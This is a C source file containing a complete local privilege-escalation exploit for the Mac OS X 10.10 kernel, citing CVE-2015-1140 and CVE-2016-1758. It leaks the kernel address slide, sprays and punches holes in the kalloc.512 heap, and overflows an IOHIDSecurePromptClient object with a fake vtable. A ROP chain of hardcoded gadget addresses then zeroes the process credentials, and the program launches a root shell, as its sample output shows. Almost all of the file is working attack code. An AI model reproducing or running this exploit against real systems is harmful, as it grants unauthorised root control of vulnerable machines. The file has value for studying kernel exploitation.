/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.10
 * BuildVersion:   14A389
 *
 * based on: https://github.com/kpwn/vpwn

 * CVE-2015-1140, CVE-2016-1758 (infoleak)

 References:
 - https://github.com/kpwn/vpwn
 - https://archive.fo/NJHtT
 - https://bazad.github.io/2016/05/mac-os-x-use-after-free/
 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1140
 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1758
 - https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-606.1.7/IOHIDSystem/IOHIDSecurePromptClient.cpp
   (10.10, IOHIDFamily-606.1.7)

$ ./pwn
[+] Leaking bytes...
[+] KASLR slide is 0x00000001e00000
[+] Got root!
bash-3.2# whoami
root
 */

#include <stdio.h>          // printf
#include <stdlib.h>         // uint64_t
#include <mach/mach.h>      // kern_return_t
#include <mach/mach_vm.h>   // mach_vm_allocate
#include <unistd.h>         // getuid
#include <net/if.h>         // struct if_clonereq
#include <sys/ioctl.h>      // SIOCIFGCLONERS

#include <IOKit/IOKitLib.h> // kIOMasterPortDefault


#define EXIT_ON_MACH_ERROR(msg, retval) \
  if (kr != KERN_SUCCESS) { \
    mach_error(msg ":" , kr); \
    exit((retval)); \
  }

#define SLIDE_PTR(addr) addr + kslide

#define SERVICE1          "IOBluetoothHCIController"
#define SERVICE2          "IOHIKeyboard"
#define HEAP_OBJECTS_NR   0x1000


uint64_t kslide_infoleak()
{

    uint64_t kslide;
    char buffer[IFNAMSIZ];

    // Try to leak several times
    for (int i = 0; i < 5; i++)
    {
        printf("[+] Leaking bytes...\n");
        sleep(1);
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd == -1)
        {
            continue;
        }

        struct if_clonereq ifcr =
        {
            .ifcr_count  = 1,
            .ifcr_buffer = buffer,
        };

        if (ioctl(sockfd, SIOCIFGCLONERS, &ifcr) == -1)
        {
            continue;
        }

        close(sockfd);

        uint64_t value = *(uint64_t *)(buffer + 8);
        /*
         * __text:FFFFFF8000344190 _ledger_credit  proc near
         * [ .. SNIP .. ]
         * __text:FFFFFF80003441EF                 mov     eax, r14d
         */
        kslide = value - 0xFFFFFF80003441EF;
        if ((kslide & ~0x7fe00000) == 0)
        {
            printf("[+] KASLR slide is %#016llx\n", kslide);
            return kslide;
        }
    }
    exit(1);
}

io_connect_t kalloc_512_alloc()
{
    io_service_t  service   = 0;
    io_connect_t  connect   = MACH_PORT_NULL;
    io_iterator_t iterator  = 0;
    kern_return_t kr        = 0;

    service = IOServiceGetMatchingServices(kIOMasterPortDefault,
                                           IOServiceMatching(SERVICE1),
                                           &iterator);
    io_object_t object = IOIteratorNext(iterator);
    if (object == IO_OBJECT_NULL)
    {
        printf("Service %s not found.\n", SERVICE1);
        exit(0);
    }
    IOServiceOpen(object, mach_task_self(), 0, &connect);
    EXIT_ON_MACH_ERROR("IOServiceOpen", kr);

    return connect;
}

void kalloc_512_free(io_connect_t connect)
{
    IOConnectRelease(connect);
}

void *alloc(void *address, uint32_t size)
{
    vm_deallocate(mach_task_self(), (vm_address_t) address, size);
    vm_allocate(mach_task_self(), (vm_address_t *) &address, size, 0);
    bzero(address, size);
    return address;
}

uint32_t heap_overflow(uint64_t vtable)
{
    io_service_t  service   = 0;
    io_connect_t  connect   = MACH_PORT_NULL;
    io_iterator_t iterator  = 0;
    kern_return_t kr        = 0;

    service = IOServiceGetMatchingServices(kIOMasterPortDefault,
                                           IOServiceMatching(SERVICE2),
                                           &iterator);
    io_object_t object = IOIteratorNext(iterator);
    if (object == IO_OBJECT_NULL)
    {
        printf("Service %s not found.\n", SERVICE2);
        exit(0);
    }

    /* 
     * put the vtable to a buffer prefixed with arbitrary 
     * 384 bytes, which is the size we need to overflow
     */
    char *buffer = malloc(384 + sizeof(uint64_t));
    memcpy(buffer + 384, &vtable, sizeof(uint64_t));

    /*
     * https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-606.1.7/IOHIDSystem/IOHIDSecurePromptClient.h
     * TYPE = 0x48535043 (HSPC)
     */

    /* Allocation happens in kalloc.512 */
    IOServiceOpen(object, mach_task_self(), 0x48535043, &connect);
    EXIT_ON_MACH_ERROR("IOServiceOpen", kr);

    /* Send the payload */
    kr = IOConnectCallMethod(connect, 12, NULL, 0, buffer, 384 + sizeof(uint64_t), NULL, 0, NULL, 0);
    EXIT_ON_MACH_ERROR("IOConnectCallMethod(12)", kr);

    return 0;
}

int main(int argc, char *argv[])
{
    sync();
    uint64_t kslide = kslide_infoleak();
    uint64_t alloc_table[HEAP_OBJECTS_NR];


#define _current_proc                   0xFFFFFF8000859A30 
#define _proc_ucred                     0xFFFFFF80007CE5D0
#define _posix_cred_get                 0xFFFFFF80007A5A90
#define _bzero                          0xFFFFFF800010E110
#define _thread_exception_return        0xFFFFFF8000417EAA

#define PIVOT_RAX                       0xFFFFFF8000638AE1 // 50 01 00 00 5B 41 5C 41 5E 41 5F 5D C3
#define POP_RCX__RET                    0xFFFFFF8000411E82 // 59 C3
#define NOP__RET                        0xFFFFFF800053676C // 90 C3

#define MOV_RDI_RAX__POP_RBP__JMP_RCX   0xFFFFFF800037D0AA // 48 89 C7 5D FF E1
#define POP_RSI__RET                    0xFFFFFF800047619E // 5E C3
#define POP_RSP__RET                    0xFFFFFF8000679FB8 // 5C C3


    /*
    __text:FFFFFF80003E7FCB FF 50 20                          call    qword ptr [rax+20h]
    __text:FFFFFF80003E7FCE 48 8D 3D FB 75 6F+                lea     rdi, _iokit_obj_to_port_binding_lock
    __text:FFFFFF80003E7FD5 E8 26 AB 02 00                    call    _lck_mtx_unlock
    */
    uint64_t vtable = 0x3133700000;
    uint64_t* rax = alloc((void*) 0x3133700000, 0x1000);
    rax[ 0x20 / sizeof(uint64_t)] = SLIDE_PTR(0xFFFFFF800085D5CD); // 
    
    /*
    __text:FFFFFF800085D5CD 48 8B 78 08                       mov     rdi, [rax+8]
    __text:FFFFFF800085D5D1 48 85 FF                          test    rdi, rdi
    __text:FFFFFF800085D5D4 74 0A                             jz      short loc_FFFFFF800085D5E0
    __text:FFFFFF800085D5D6 48 8B 07                          mov     rax, [rdi]
    __text:FFFFFF800085D5D9 5D                                pop     rbp
    __text:FFFFFF800085D5DA FF A0 60 02 00 00                 jmp     qword ptr [rax+260h]
    */
    uint64_t* rdi = alloc((void*) 0x1122330000, 0x1000);
    rax[  0x8 / sizeof(uint64_t)] = 0x1122330000; // mov rdi, [rax+8]
    rdi[  0x0 / sizeof(uint64_t)] = 0x1122330000; // mov rax, [rdi]
    rdi[0x260 / sizeof(uint64_t)] = SLIDE_PTR(0xFFFFFF800039E740); // jmp qword ptr [rax+260h]

    /*
    __text:FFFFFF800039E740                   _memory_object_reference proc near
    __text:FFFFFF800039E740 55                                push    rbp
    __text:FFFFFF800039E741 48 89 E5                          mov     rbp, rsp
    __text:FFFFFF800039E744 48 8B 47 08                       mov     rax, [rdi+8]
    __text:FFFFFF800039E748 5D                                pop     rbp
    __text:FFFFFF800039E749 FF 20                             jmp     qword ptr [rax]
    */
    rdi[  0x8 / sizeof(uint64_t)] = 0x1122330000 + 0x10; // mov rax, [rdi+8]; jmp qword ptr [rax]

    /* Set RSP to RAX (0x1122330010) decrement by 0x8 * 3 (per r14, r15, rbp) = 0x1122330028 */
    rdi[ 0x10 / sizeof(uint64_t)] = SLIDE_PTR(PIVOT_RAX);
    /*
     * __text:FFFFFF8000638AE1 50                                push    rax
     * __text:FFFFFF8000638AE2 01 00                             add     [rax], eax
     * __text:FFFFFF8000638AE4 00 5B 41                          add     [rbx+41h], bl
     * __text:FFFFFF8000638AE7 5C                                pop     rsp
     * __text:FFFFFF8000638AE8 41 5E                             pop     r14
     * __text:FFFFFF8000638AEA 41 5F                             pop     r15
     * __text:FFFFFF8000638AEC 5D                                pop     rbp
     * __text:FFFFFF8000638AED C3                                retn
     */

    /* At this time the stack is successfully redirected to rdi+0x28 */
    uint64_t *rop = (uint64_t *) &rdi[ 0x28 / sizeof(uint64_t)];
    

    /* ----- BEGIN ESCALATION PAYLOAD ------ */
    // proc = _current_proc() (result would be in RAX)
    *rop++ = SLIDE_PTR(_current_proc);
    *rop++ = SLIDE_PTR(POP_RCX__RET);

    // ucred = _proc_ucred(proc)
    *rop++ = SLIDE_PTR(NOP__RET); // NOP would be in RCX, then RET to next line
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); // store RAX to RDI (1st arg)
    *rop++ = 0xDEADBEEFDEADBEEF; // RBP
    *rop++ = SLIDE_PTR(_proc_ucred);

    // posix_cred = _posix_cred_get(ucred)
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); 
    *rop++ = 0xDEADBEEFDEADBEEF;
    *rop++ = SLIDE_PTR(_posix_cred_get);

    // _bzero(posix_cred, sizeof(int) * 3)
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); 
    *rop++ = 0xDEADBEEFDEADBEEF;
    *rop++ = SLIDE_PTR(POP_RSI__RET);
    *rop++ = sizeof(int) * 3; // RSI, 2nd arg
    *rop++ = SLIDE_PTR(_bzero);

    // return from the kernel
    *rop++ = SLIDE_PTR(_thread_exception_return);
    /* ----- END ESCALATION PAYLOAD  ------ */


    // allocate the memory in the kernel heap
    for (int i = 0; i < HEAP_OBJECTS_NR; i++)
    {
        alloc_table[i] = kalloc_512_alloc();
    }

    // punch holes
    for (int i = (HEAP_OBJECTS_NR / 4) * 3; i < HEAP_OBJECTS_NR; i++)
    {
        if (i % 2)
        {
            kalloc_512_free(alloc_table[i]);
            alloc_table[i] = 0;
        }
    }

    // trigger the exploit, put the vulnerable buffer to the one of the holes
    heap_overflow(vtable);

    // call the overwritten vtable of the freed object
    for (int i = 0; i < HEAP_OBJECTS_NR; i++)
    {
        if (alloc_table[i])
        {
            kalloc_512_free(alloc_table[i]);
        }
    }

    if (getuid() == 0)
    {
        puts("[+] Got root!");
        system("/bin/bash");
    }

    return 0; // if we return, exploit failed
}